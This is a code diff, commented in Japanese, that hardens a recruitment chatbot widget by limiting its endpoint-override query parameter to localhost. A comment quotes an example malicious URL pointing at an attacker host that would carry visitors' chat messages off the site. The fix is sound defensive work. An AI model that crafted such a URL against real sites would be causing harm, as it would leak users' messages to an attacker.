@@ -4,21 +4,28 @@
   // Phase A 採用FAQチャットボット (Vertex AI Gemini backend, chatbot/ 参照)。
   // map-search.js と同じ「末尾script + 専用JSモジュール + DOM自己注入」パターン。
   //
-  // エンドポイント解決順: (1) URLクエリ ?chatbot_endpoint= (ローカル確認用、コミット不要で
-  // 差し替え可能) → (2) このscriptタグの data-endpoint 属性 → (3) 下記デフォルト定数。
+  // エンドポイント解決順: (1) このscriptタグの data-endpoint 属性 → (2) 下記デフォルト定数。
   // デフォルトはまだ実デプロイされていないプレースホルダーであり、Cloud Run へのデプロイ完了後
   // (chatbot/README.md 参照) に data-endpoint 属性で本番URLへ差し替える想定。
+  //
+  // ローカル確認用の ?chatbot_endpoint= クエリ上書きは localhost/127.0.0.1 でのみ有効
+  // (/code-review high で指摘: 本番オリジンで無制限に許可すると、悪意あるURL
+  // `?chatbot_endpoint=https://attacker.example/collect` を踏んだ訪問者の入力メッセージが
+  // 攻撃者サーバーへ送信されてしまうデータ流出経路になる)。
   var DEFAULT_ENDPOINT = 'https://aozora-chatbot-PENDING-DEPLOY.asia-northeast1.run.app/chat';
   var MAX_HISTORY_TURNS = 6;
+  var LOCAL_HOSTNAMES = ['localhost', '127.0.0.1'];
 
   var currentScript = document.currentScript;
 
   function resolveEndpoint() {
-    try {
-      var fromQuery = new URLSearchParams(window.location.search).get('chatbot_endpoint');
-      if (fromQuery) return fromQuery;
-    } catch (e) {
-      // URLSearchParams 非対応の古いブラウザ等は無視して次のフォールバックへ。
+    if (LOCAL_HOSTNAMES.indexOf(window.location.hostname) !== -1) {
+      try {
+        var fromQuery = new URLSearchParams(window.location.search).get('chatbot_endpoint');
+        if (fromQuery) return fromQuery;
+      } catch (e) {
+        // URLSearchParams 非対応の古いブラウザ等は無視して次のフォールバックへ。
+      }
     }
     if (currentScript && currentScript.getAttribute('data-endpoint')) {
       return currentScript.getAttribute('data-endpoint');
